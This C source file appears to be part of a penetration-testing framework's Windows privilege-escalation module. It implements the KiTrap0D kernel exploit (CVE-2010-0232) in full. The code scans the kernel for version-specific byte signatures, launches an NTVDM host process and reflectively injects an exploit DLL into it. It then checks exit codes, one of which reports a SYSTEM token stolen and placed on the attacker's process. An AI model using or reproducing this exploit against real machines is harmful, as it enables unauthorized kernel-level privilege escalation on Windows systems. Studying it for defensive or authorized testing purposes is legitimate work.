// A port of HDM's/Pusscat's implementation of Tavis Ormandy's code (vdmallowed.c).
// http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html

// Known Bugs:
//   * Windows NT4 fails to map the NULL page, (exit code 'NTAV').
//   * Windows 2000 fails to find the VDM_TIB size (something else is wrong)
//   * Windows 2008 Storage Server has 16-bit applications disabled by default
//   * Windows 2008 Storage Server is also missing twunk_16.exe, has debug.exe

#include "precomp.h"
#include "kitrap0d.h"
#include "../../../../ReflectiveDLLInjection/LoadLibraryR.h"

// These are generated using kd -kl -c 'db nt!Ki386BiosCallReturnAddress;q'
struct CodeSignature CodeSignatures[] = {
	{ "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00", 0 }, // Windows NT4
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84", 1 }, // Windows 2000
	{ "\x64\xA1\x1C\x00\x00\x00\x5F\x8B\x70\x04\xB9\x84\x00\x00\x00\x89", 1 }, // Windows 2000 SP4 Advanced Server
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84", 2 }, // Windows XP
	{ "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00", 3 }, // Windows 2003
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 3 }, // Windows .NET
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 4 }, // Windows Vista
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 5 }, // Windows 2008
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 6 }, // Windows 7
	{ "", -1 }
};

/*
 * Scan the appropriate kernel image for the correct offset
 */
BOOL kitrap0d_scan_kernel( PDWORD KernelBase, PDWORD OffsetFromBase )
{
	DWORD dwResult                       = ERROR_SUCCESS;
	FARPROC NtQuerySystemInformation     = NULL;
	HMODULE hKernel                      = NULL;
	HMODULE hNtdll                       = NULL;
	PIMAGE_DOS_HEADER DosHeader          = NULL;
	PIMAGE_NT_HEADERS PeHeader           = NULL;
	PIMAGE_OPTIONAL_HEADER OptHeader     = NULL;
	PBYTE ImageBase                      = NULL;
	HKEY MmHandle                        = NULL;
	OSVERSIONINFO os                     = {0};
	SYSTEM_MODULE_INFORMATION ModuleInfo = {0};
	DWORD PhysicalAddressExtensions      = 0;
	DWORD DataSize                       = 0;
	ULONG i                              = 0;
	ULONG x                              = 0;

	// List of versions we have code signatures for.
	enum {
		MICROSOFT_WINDOWS_NT4   = 0,
		MICROSOFT_WINDOWS_2000  = 1,
		MICROSOFT_WINDOWS_XP    = 2,
		MICROSOFT_WINDOWS_2003  = 3,
		MICROSOFT_WINDOWS_VISTA = 4,
		MICROSOFT_WINDOWS_2008  = 5,
		MICROSOFT_WINDOWS_7     = 6,
	} Version = MICROSOFT_WINDOWS_7;

	do
	{
		hNtdll = GetModuleHandle("ntdll");
		if( !hNtdll )
			BREAK_WITH_ERROR( "[KITRAP0D] kitrap0d_scan_kernel. GetModuleHandle ntdll failed", ERROR_INVALID_HANDLE );

		// NtQuerySystemInformation can be used to find kernel base address
		NtQuerySystemInformation = GetProcAddress( hNtdll, "NtQuerySystemInformation" );
		if( !NtQuerySystemInformation )
			BREAK_WITH_ERROR( "[KITRAP0D] kitrap0d_scan_kernel. GetProcAddress NtQuerySystemInformation failed", ERROR_INVALID_HANDLE );

		// Determine kernel version so that the correct code signature is used
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );
		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[KITRAP0D] kitrap0d_scan_kernel. GetVersionEx failed" );

		dprintf( "[KITRAP0D] kitrap0d_scan_kernel. GetVersionEx() => %u.%u", os.dwMajorVersion, os.dwMinorVersion);

		if( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 )
			Version = MICROSOFT_WINDOWS_NT4;
		if( os.dwMajorVersion == 5 && os.dwMinorVersion == 0 )
			Version = MICROSOFT_WINDOWS_2000;
		if( os.dwMajorVersion == 5 && os.dwMinorVersion == 1 )
			Version = MICROSOFT_WINDOWS_XP;
		if( os.dwMajorVersion == 5 && os.dwMinorVersion == 2 )
			Version = MICROSOFT_WINDOWS_2003;
		if( os.dwMajorVersion == 6 && os.dwMinorVersion == 0 )
			Version = MICROSOFT_WINDOWS_VISTA;
		if( os.dwMajorVersion == 6 && os.dwMinorVersion == 0 )
			Version = MICROSOFT_WINDOWS_2008;
		if( os.dwMajorVersion == 6 && os.dwMinorVersion == 1 )
			Version = MICROSOFT_WINDOWS_7;

		// Learn the loaded kernel (e.g. NTKRNLPA vs NTOSKRNL), and it's base address
		NtQuerySystemInformation( SystemModuleInformation, &ModuleInfo, sizeof( ModuleInfo ), NULL );
		
		dprintf( "[KITRAP0D] kitrap0d_scan_kernel. NtQuerySystemInformation() => %s@%p", ModuleInfo.Module[0].ImageName, ModuleInfo.Module[0].Base );

		// Load the kernel image specified
		hKernel = LoadLibrary( strrchr( ModuleInfo.Module[0].ImageName, '\\' ) + 1 );
		if( !hKernel )
			BREAK_ON_ERROR( "[KITRAP0D] kitrap0d_scan_kernel. LoadLibrary failed" );

		// Parse image headers
		*KernelBase = (DWORD)ModuleInfo.Module[0].Base;
		ImageBase   = (PBYTE)hKernel;
		DosHeader   = (PIMAGE_DOS_HEADER)ImageBase;
		PeHeader    = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
		OptHeader   = &PeHeader->OptionalHeader;
	
		dprintf( "[KITRAP0D] kitrap0d_scan_kernel. Searching for kernel %u.%u signature: version %d...", os.dwMajorVersion, os.dwMinorVersion, Version );

		for( x=0 ; ; x++ )
		{
			if( CodeSignatures[x].Version == -1 )
				break;

			if( CodeSignatures[x].Version != Version )
				continue;

			dprintf( "[KITRAP0D] kitrap0d_scan_kernel. Trying signature with index %d", x );

			// Scan for the appropriate signature...
			for( i = OptHeader->BaseOfCode ; i < OptHeader->SizeOfCode ; i++ )
			{
				if( memcmp( &ImageBase[i], CodeSignatures[x].Signature, sizeof CodeSignatures[x].Signature ) == 0 )
				{
					dprintf( "[KITRAP0D] kitrap0d_scan_kernel. Signature found %#x bytes from kernel base", i );

					*OffsetFromBase = i;

					FreeLibrary( hKernel );

					return TRUE;
				}
			}
		}

	} while( 0 );

	dprintf( "[KITRAP0D] kitrap0d_scan_kernel. Code not found, the signatures need to be updated for this kernel" );

	if( hKernel )
		FreeLibrary( hKernel );

	return FALSE;
}

/*
 * Grab a useful Handle to NTVDM.
 */
BOOL kitrap0d_spawn_ntvdm( char * cpProgram, HANDLE * hProcess )
{
	DWORD dwResult         = ERROR_SUCCESS;
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si         = {0};
	ULONG i                = 0;

	do
	{
		si.cb = sizeof( STARTUPINFO );

		// Start the child process, which should invoke NTVDM...
		if( !CreateProcess( cpProgram, cpProgram, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
			BREAK_ON_ERROR( "[KITRAP0D] kitrap0d_spawn_ntvdm. CreateProcess failed" );

		dprintf( "[KITRAP0D] kitrap0d_spawn_ntvdm. CreateProcess(\"%s\") => %u", cpProgram, pi.dwProcessId );

		// Get more access
		*hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pi.dwProcessId );
		if( *hProcess == NULL )
		{
			TerminateProcess( pi.hProcess, 'SPWN' );
			CloseHandle( pi.hThread );
			CloseHandle( pi.hProcess );
			BREAK_ON_ERROR( "[KITRAP0D] kitrap0d_spawn_ntvdm. OpenProcess failed" );
		}

		dprintf( "[KITRAP0D] kitrap0d_spawn_ntvdm. OpenProcess(%u) => %#x", pi.dwProcessId, *hProcess );

		CloseHandle( pi.hThread );

		CloseHandle( pi.hProcess );

	} while( 0 );

	if( dwResult == ERROR_SUCCESS )
		return TRUE;

	return FALSE;
}

/*
 * Find a suitable exe to host the exploit in.
 */
BOOL elevate_via_exploit_getpath( char * cpOutput, DWORD dwOutputLength )
{
	DWORD dwResult         = ERROR_SUCCESS;
	char cWinDir[MAX_PATH] = {0};
	DWORD dwIndex          = 0;
	char * cpFiles[]       = {  "twunk_16.exe", 
								"debug.exe", 
								"system32\\debug.exe", 
								NULL };

	do
	{
		if( !GetWindowsDirectory( cWinDir, MAX_PATH ) )
			BREAK_ON_ERROR( "[KITRAP0D] elevate_via_exploit_getpath. GetWindowsDirectory failed" );
	
		while( TRUE )
		{
			char * cpFileName = cpFiles[dwIndex];
			if( !cpFileName )
				break;

			if( cWinDir[ strlen(cWinDir) - 1 ] == '\\' )
				_snprintf( cpOutput, dwOutputLength, "%s%s", cWinDir, cpFileName );
			else
				_snprintf( cpOutput, dwOutputLength, "%s\\%s", cWinDir, cpFileName );

			dprintf( "[KITRAP0D] elevate_via_exploit_getpath. Trying: %s", cpOutput );

			if( GetFileAttributes( cpOutput ) != INVALID_FILE_ATTRIBUTES )
				return TRUE;

			memset( cpOutput, 0, dwOutputLength );

			dwIndex++;
		}

	} while(0);

	return FALSE;
}

/*
 * (CVE-2010-0232)
 */
DWORD elevate_via_exploit_kitrap0d( Remote * remote, Packet * packet )
{
	DWORD dwResult              = ERROR_SUCCESS;
	HANDLE hVdm                 = NULL;
	HANDLE hThread              = NULL;
	LPVOID lpServiceBuffer      = NULL;
	LPVOID lpRemoteCommandLine  = NULL;
	char cWinDir[MAX_PATH]      = {0};
	char cVdmPath[MAX_PATH]     = {0};
	char cCommandLine[MAX_PATH] = {0};
	DWORD dwExitCode            = 0;
	DWORD dwKernelBase          = 0;
	DWORD dwOffset              = 0;
	DWORD dwServiceLength       = 0;

	do
	{
		// only works on x86 systems...
		if( elevate_getnativearch() != PROCESS_ARCH_X86 )
			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. Unsuported platform", ERROR_BAD_ENVIRONMENT );

		dprintf( "[KITRAP0D] elevate_via_exploit_kitrap0d. Starting..." );

		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
		lpServiceBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );

		if( !dwServiceLength || !lpServiceBuffer )
			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. invalid arguments", ERROR_BAD_ARGUMENTS );

		// 1. first get a file path to a suitable exe...
		if( !elevate_via_exploit_getpath( (char *)&cVdmPath, MAX_PATH ) )
			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. elevate_via_exploit_getpath failed", ERROR_FILE_NOT_FOUND );

		// 2. Scan kernel image for the required code sequence, and find the base address...
		if( !kitrap0d_scan_kernel( &dwKernelBase, &dwOffset ) )
			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. kitrap0d_scanforcodesignature failed", ERROR_INVALID_HANDLE );
		
		// 3. Invoke the NTVDM subsystem, by launching any MS-DOS executable...

		dprintf( "[KITRAP0D] elevate_via_exploit_kitrap0d. Starting the NTVDM subsystem by launching MS-DOS executable" );
		
		if( !kitrap0d_spawn_ntvdm( cVdmPath, &hVdm ) )
			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. kitrap0d_spawn_ntvdm failed", ERROR_INVALID_HANDLE );

		// 4. Use RDI to inject the elevator dll into the remote NTVDM process...
		//    Passing in the parameters required by exploit thread via the LoadRemoteLibraryR inject technique.

		_snprintf( cCommandLine, sizeof(cCommandLine), "/KITRAP0D /VDM_TARGET_PID:0x%08X /VDM_TARGET_KRN:0x%08X /VDM_TARGET_OFF:0x%08X\x00", GetCurrentProcessId(), dwKernelBase, dwOffset );

		// alloc some space and write the commandline which we will pass to the injected dll...
		lpRemoteCommandLine = VirtualAllocEx( hVdm, NULL, strlen(cCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
		if( !lpRemoteCommandLine )
			BREAK_ON_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. VirtualAllocEx failed" ); 

		if( !WriteProcessMemory( hVdm, lpRemoteCommandLine, cCommandLine, strlen(cCommandLine)+1, NULL ) )
			BREAK_ON_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. WriteProcessMemory failed" ); 

		// inject the dll...
		hThread = LoadRemoteLibraryR( hVdm, lpServiceBuffer, dwServiceLength, lpRemoteCommandLine );
		if( !hThread )
			BREAK_ON_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. LoadRemoteLibraryR failed" ); 

		// 5. Wait for the thread to complete
		dprintf( "[KITRAP0D] elevate_via_exploit_kitrap0d. WaitForSingleObject(%#x, INFINITE);", hThread );
		WaitForSingleObject( hThread, INFINITE );

		// pass some information back via the exit code to indicate what happened.
		GetExitCodeThread( hThread, &dwExitCode );

		dprintf( "[KITRAP0D] elevate_via_exploit_kitrap0d. GetExitCodeThread(%#x, %p); => %#x", hThread, &dwExitCode, dwExitCode );
		
		switch( dwExitCode )
		{
			case 'VTIB':
				// A data structure supplied to the kernel called VDM_TIB has to have a 'size' field that
				// matches what the kernel expects.
				// Try running `kd -kl -c 'uf nt!VdmpGetVdmTib;q'` and looking for the size comparison.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread was unable to find the size of the VDM_TIB structure", dwExitCode );
			case 'NTAV':
				// NtAllocateVirtualMemory() can usually be used to map the NULL page, which NtVdmControl()
				// expects to be present.
				// The exploit thread reports it didn't work.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread was unable to map the virtual 8086 address space", dwExitCode );
			case 'VDMC':
				// NtVdmControl() must be initialised before you can begin vm86 execution, but it failed.
				// It's entirely undocumented, so you'll have to use kd to step through it and find out why
				// it's failing.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread reports NtVdmControl() failed", dwExitCode );
			case 'LPID':
				// This exploit will try to transplant the token from PsInitialSystemProcess on to an
				// unprivileged process owned by you.
				// PsLookupProcessByProcessId() failed when trying to find your process.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread reports that PsLookupProcessByProcessId() failed", dwExitCode );
			case FALSE:
				// This probably means LoadLibrary() failed, perhaps the exploit dll could not be found?
				// Verify the vdmexploit.dll file exists, is readable and is in a suitable location.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread was unable to load the injected dll", dwExitCode );
			case 'w00t':
				// This means the exploit payload was executed at ring0 and succeeded.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread reports exploitation was successful", ERROR_SUCCESS );
			default:
				// Unknown error. Sorry, you're on your own.
				BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. The exploit thread returned an unexpected error. ", dwExitCode );
		}

	} while( 0 );

	if( hVdm )
	{
		TerminateProcess( hVdm, 0 );
		CloseHandle( hVdm );
	}

	if( hThread )
		CloseHandle( hThread );

	return dwResult;
}
